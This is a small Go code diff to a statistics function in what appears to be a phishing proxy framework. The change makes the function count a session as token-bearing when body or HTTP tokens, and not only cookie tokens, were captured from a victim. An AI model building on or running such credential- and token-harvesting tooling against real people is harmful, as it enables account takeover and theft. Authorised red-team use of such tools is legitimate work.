@@ -203,7 +203,7 @@ func (s *Stats) GetPhishletStats(phishlet string) (string, error) {
 		if sess.Username != "" || sess.Password != "" {
 			stats.WithCredentials++
 		}
-		if len(sess.CookieTokens) > 0 {
+		if len(sess.CookieTokens) > 0 || len(sess.BodyTokens) > 0 || len(sess.HttpTokens) > 0 {
 			stats.WithTokens++
 		}
 		if sess.RemoteAddr != "" {
